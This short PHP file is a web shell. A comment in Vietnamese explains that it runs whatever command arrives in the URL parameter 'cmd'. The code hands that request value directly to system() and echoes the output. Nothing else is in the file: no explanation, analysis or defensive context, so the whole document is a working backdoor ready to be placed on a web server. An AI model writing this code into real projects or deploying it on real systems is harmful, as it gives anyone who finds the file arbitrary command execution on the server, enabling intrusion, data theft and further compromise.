<?php
// Dùng hàm system để thực thi lệnh từ tham số 'cmd' trên URL
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>